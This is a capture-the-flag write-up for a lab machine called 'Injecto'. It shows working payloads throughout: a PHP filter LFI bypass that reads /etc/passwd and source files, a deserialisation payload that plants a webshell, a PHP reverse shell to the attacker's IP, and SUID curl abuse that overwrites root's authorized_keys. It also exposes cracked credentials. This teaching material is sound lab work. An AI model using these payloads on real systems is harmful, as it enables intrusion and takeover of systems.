Injecto

Target IP: 192.168.227.173
Challenge Description: N/A.

Reconnaissance


There are three TCP ports open on the target machine according to the TCP port scan. The command I used is sudo nmap -sS 192.168.227.173 -p- as shown in the image above.


Running an aggressive TCP port scan using the command sudo nmap -sV -A 192.168.227.173 -p 22,80,8080 returns the result shown in the image above. The target machine is running OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 SSH application on port 22. The ports 80 and 8080 are serving web applications. On port 80, the web server application is Apache httpd 2.4.41. On port 8080, the web server application is nginx 1.18.0.

Enumeration

Port 80: HTTP

The webpage shown in the picture above is returned for this web application on port 80. I checked the source-code of the webpage and identified there are two other URLs. This page has two clickable buttons: Blackdeath and Coronavirus.


I hovered over the two buttons and identified they are included using the parameter page, as shown in the image above.


Clicking the Coronavirus button returns the included page shown in the image above. The same thing happens if I press the Blackdeath button too, as the page is included directly in the webpage. Since the pages are being included, is this web application vulnerable to directory-traversal, LFI, or even RFI?


I started burpsuite on my machine. Then I intercepted the HTTP request to the web application on port 80. When I passed an empty value inside the page parameter, I received the output shown above. There is an error message stating Tampering Detected!. Hmmm. I notice the web application does not like any form of ../ characters. This makes it difficult to perform directory traversal and LFI. I tried URL encoding and double URL encoding, but I had no luck. Since the web server is using Apache -- it could be using PHP. And another way to bypass this protection mechanism are PHP Filters.


And bingo. Using the PHP filter php://filter/read=convert.base64-encode/resource=<file to read>, I managed to bypass this protection mechanism as shown in the image above. However, I notice I cannot read any other files on the machine except coronavirus and blackdeath. Reading these pages are not helpful though as they don't have anything useful. Also, the web application seems to append the .php extension automatically. The next goal is to read the index.php file to identify what filter is in place.


When attemping to read the /etc/passwd file on the server directly using the PHP filter, I still get the error message as shown in the image above. It is likely the web application only accepts the coronavirus and blackdeath pages.


However, when I use the payload php://filter/read=convert.base64-encode/resource=coronavirus/../../../../../../etc/passwd, the error message is not shown anymore. And it seems to be correct. The web application is likely checking for the strings coronavirus and blackdeath to ensure it is included. Since the web application is also using Apache httpd 2.4.41, the default web directory is /var/www/html. To defeat this defense mechanism, we can traverse out of the directory. The payload must include the expected string coronavirus or blackdeath, and we can perform directory traversal to access the PHP files. Keep in mind, the web application automatically adds the .php extension for us.


And now I have access to the source-code index.php file as shown in the image above. To achieve this, I used the payload php://filter/read=convert.base64-encode/resource=/var/www/html/coronavirus/../index. This payload is self-explanatory. We browse into the web directory root /var/www/html first. Since, the web application expects coronavirus or blackdeath, it is appended after the web directory root. Then we traverse one directory out and access the index.php file. After decoding the base64 string, I obtained the following source code:

Port 8080: HTTP

The webpage shown in the picture above is returned for this web application on port 8080. The layout of the webpage is messed up and all over the place. The CSS seems to be messy.


When checking the source-code of the webpage, I identified the developer comment shown in the image above. It contains the message Under Development -- r1pp3r6944 can you complete code in dbconnect.php for mysql. This file dbconnect.php sounds promising. Also the username r1pp3r6944 could be useful in later stages. I performed a directory search and looked further, but I didn't find anything else. Time to see if I can read the source code of this web page using the LFI vulnerability found in other web application.


Using the payload php://filter/read=convert.base64-encode/resource=/var/www/html/coronavirus/../../../../../../../../../usr/share/nginx/html/dbconnect, I managed to access the dbconnect.php file as shown in the image above. I tried to access this file in the /var/www/html directory, but I had no luck. Instead, I got a hit when searching at /usr/share/nginx/html directory. After decoding the contents, I now have the username r1pp3r6944 and password hash 4b84fa3869514cd7dad9a62447d05b6d.


After cracking the password hash 4b84fa3869514cd7dad9a62447d05b6d, I now have the password iamin. I tried to connect to the target machine via SSH using the credentials r1pp3r6944:iamin, but I had no luck. Time to check the source code of the web application on port 8080.


Using the payload php://filter/read=convert.base64-encode/resource=/var/www/html/coronavirus/../../../../../../../../../usr/share/nginx/html/index, I managed to access the source code (index.php) of the web application at port 8080. I decoded the base64 string and obtained the following code:

In the web application, there is a small section that can be used to fill out a form. The web application is hard to use, but if the CSS file is removed from the HTML header it is easier to use. This PHP code defines a class called MyClass that is responsible for saving input data from HTTP GET parameters into a text file called msgwithres.txt. The method Savemsgo() is responsible for constructing the message from the user's input into a public property called msgo. When the destructor method is called, it saves the content of msgo inside the file called msgwithres.txt. This is where the vulnerability exists. The value from a potential parameter named values_submit from the query string is also used, or it defaults to an empty string if it doesn't exist. It also calls unserialise on this value. It could lead to unused data or even potential issues if values_submit isn’t formatted correctly. This is where we can insert our malicious payload. Then the new instance object is created using the GET parameters. It then formats the message and prepares it for saving. This web application is vulnerable to Insecure Object Deserialisation attack. This attack is explained here.

Exploitation

Owning the Port 8080 Web Application via PHP Insecure Object Deserialisation


After plenty of trial and error, I managed to craft the PHP payload: O:7:"MyClass":2:{s:9:"form_file";s:9:"shell.php";s:4:"msgo";s:29:"<?php+system($_GET['cmd']);?>";}. This just creates a simple PHP webshell by the name shell.php. The full URL is http://192.168.227.173:8080/index.php?values_submit=O:7:"MyClass":2:{s:9:"form_file";s:9:"shell.php";s:4:"msgo";s:29:"<?php system(\$_GET['cmd']);?>";}. I URL encoded the payload before deploying it via cURL. The URL encoded payload is http://192.168.227.173:8080/index.php?values_submit=O:7:%22MyClass%22:2:%7Bs:9:%22form_file%22;s:9:%22shell.php%22;s:4:%22msgo%22;s:29:%22%3C?php+system(\$_GET%5B'cmd'%5D);?%3E%22;%7D. And as shown in the image above on the bottom terminal, now I can perform RCE on the target machine using my simple PHP webshell. Time to obtain a reverse shell connection.


In the image above, there are two shells. The shell on top is where I deploy a PHP reverse shell command to invoke a connection to my machine at port 80. The encoded URL is curl http://192.168.227.173:8080/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.206%22%2C80%29%3Bshell_exec%28%22%2Fbin%2Fsh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27. And again, the bottom terminal is where I start a listener. I caught the reverse shell after deploying the PHP reverse shell. Now I have a reverse shell connection with the session as www-data.

Privilege Escalation

Vertical Privilege Escalation: User www-data to User root via curl SUID Misconfiguration


After obtaining a shell, I tried to switch to the user r1pp3r6944 on the target machine using the previously obtained password iamin, but I had no luck. When checking for binaries with SUID bit set using the command find / -perm -u=s -type f 2>/dev/null, I obtained the entry /usr/bin/curl. This is unusual. Since this binary has SUID bit set, I can use it to replace the SSH key of the user root.


On my machine, I ran the command ssh-keygen to generate an SSH keypair. I saved it as root. Then I renamed the root.pub to authorized_keys. Afterwards, I started a Python HTTP server on my machine at port 8080.


To replace the authorized_keys belonging to the user root, I ran the command curl http://192.168.45.206:8080/authorized_keys -o /root/.ssh/authorized. And bingo. As shown in the picture above on the top terminal, it ran successfully. It managed to download and replace the authorized_key of user root.


I changed the permission of the SSH key using the command chmod 400 root. Then I ran the command ssh root@192.168.227.173 -i root to connect to the target machine as the user root. Now I have a root shell access on the target machine as shown in the image above.

Flags


The two flags, proof.txt and local.txt, are shown in the image above.
